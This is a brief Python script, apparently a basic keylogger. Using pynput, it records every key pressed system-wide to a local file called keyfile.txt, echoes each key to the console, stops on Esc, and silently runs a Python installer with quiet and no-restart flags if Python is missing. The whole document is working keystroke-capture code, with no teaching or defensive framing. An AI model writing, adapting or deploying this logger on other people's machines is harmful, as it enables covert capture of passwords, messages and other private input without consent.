import subprocess
import os
from pynput import keyboard

def install_python():
    #check if python is installed already
        if not os.path.exists("C:\\Python311\\python.exe"):
            python_installer = "python-3.11.9-amd64.exe"
            #run python installer silently
            subprocess.run([python_installer, '/quiet', '/norestart'])


key_count = 0

def keyPressed(key):
    global key_count
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        if key_count >= 50:
            logKey.write('\n')#new line every 50 inputs to keep clean
            key_count = 0
        try:
            char = key.char
            logKey.write(char)
        except:
            if key == keyboard.Key.space: 
                 logKey.write(' ') # When Space is pressed write ' ' instead of key.space
            else:
                logKey.write(f'[{key}]')

    key_count += 1 #increment the counter

    if key == keyboard.Key.esc:
        return False
    
if __name__ == "__main__":

    install_python()

    open("keyfile.txt", 'w').close()

    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()
    input()